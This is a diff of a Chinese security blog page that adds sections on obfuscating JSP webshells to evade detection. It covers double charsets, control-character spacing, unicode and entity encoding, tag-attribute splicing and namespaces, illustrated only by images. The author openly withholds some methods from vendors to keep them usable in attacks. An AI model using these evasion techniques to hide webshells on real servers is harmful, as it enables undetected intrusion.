+<h3 id="double-chraset"><a href="#double-chraset" class="headerlink" title="double chraset"></a>double chraset</h3><p>双重字符集，这里以前文UTF-16BE 后文CP037为例：</p>
+<p><img src="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/double_charset.png" alt="double_charset"></p>
+<p><img src="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/double_charset_demo.png" alt="double_charset_demo"></p>
+<h3 id="controller-space"><a href="#controller-space" class="headerlink" title="controller space"></a>controller space</h3><p>xml 1.1版本下，将标签内的左右括号进行对应的字符替换，该模式目前支持的字符集为utf-8/iso-8859-1/utf-16：</p>
+<p><img src="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/controller_space.png" alt="controller_space"></p>
+<p>UTF-8字符集情况下：</p>
+<p><img src="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/controller_space_demo.png" alt="controller_space_demo"></p>
+<p>ISO-8859-1情况下的特殊空白字符：</p>
+<p><img src="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/controller_space_demo2.png" alt="controller_space_demo"></p>
+<h3 id="unicode-amp-entity"><a href="#unicode-amp-entity" class="headerlink" title="unicode &amp; entity"></a>unicode &amp; entity</h3><p>这里使用双重编码对标签内的代码进行编码，即使用 unicode + html entity：</p>
+<p><img src="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/entity.png" alt="entity"></p>
+<p><img src="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/eneity_demo.png" alt="eneity_demo"></p>
+<h3 id="ext-tags"><a href="#ext-tags" class="headerlink" title="ext tags"></a>ext tags</h3><p>将代码拼接到 setProperty/useBean标签的属性中 ，该手法参考补天会议：</p>
+<p><img src="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/exttag.png" alt="exttag"></p>
+<p><img src="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/exttag_demo.png" alt="exttag_demo"></p>
+<h3 id="namespace"><a href="#namespace" class="headerlink" title="namespace"></a>namespace</h3><p><img src="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/namespace.png" alt="namespace"></p>
+<p><img src="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/namespace_demo.png" alt="namespace"></p>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>​        通过本工具我们可以便捷地了解JSP中的这些编码手法，各手法的组合需要他们的逻辑不冲突，而某些手法组合的代码实现比较麻烦，笔者就暂先没有整，大家可自行探索。当然，笔者也稍微藏了一手，毕竟如果厂商都明白了，那我们实战起来也就不那么痛快了，但如果你能真正弄懂这个矩阵中的手法，相信也能发现其他手法。而相对整个webshell的混淆知识的图谱来说，本文也只是一角。</p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.anquanke.com/post/id/210630" target="_blank" rel="noopener">https://www.anquanke.com/post/id/210630</a></p>
+<p><a href="https://www.anquanke.com/post/id/209826" target="_blank" rel="noopener">https://www.anquanke.com/post/id/209826</a></p>
+<p><code>extTag setProperty/useBean拼接代码手法</code> 参考补天2022 webshell黑魔法</p>
 
       
 
@@ -465,7 +225,7 @@ private ImmutablePair&lt;Integer, Integer&gt; checkSql(String raw, String parsed
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2022/09/20/JAVA-RASP%E9%AB%98%E6%95%88%E6%A3%80%E6%B5%8BSQL%E6%B3%A8%E5%85%A5/">展开全文 >></a>
+          <a class="article-more-a" href="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/">展开全文 >></a>
         </p>
       
 
@@ -497,7 +257,7 @@ private ImmutablePair&lt;Integer, Integer&gt; checkSql(String raw, String parsed
   
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/5/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><a class="page-number" href="/page/8/">8</a><span class="space">&hellip;</span><a class="page-number" href="/page/29/">29</a><a class="extend next" rel="next" href="/page/7/">Next &amp;raquo;</a>
+      <a class="extend prev" rel="prev" href="/page/5/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><a class="page-number" href="/page/8/">8</a><span class="space">&hellip;</span><a class="page-number" href="/page/31/">31</a><a class="extend next" rel="next" href="/page/7/">Next &amp;raquo;</a>
     </nav>
   
 
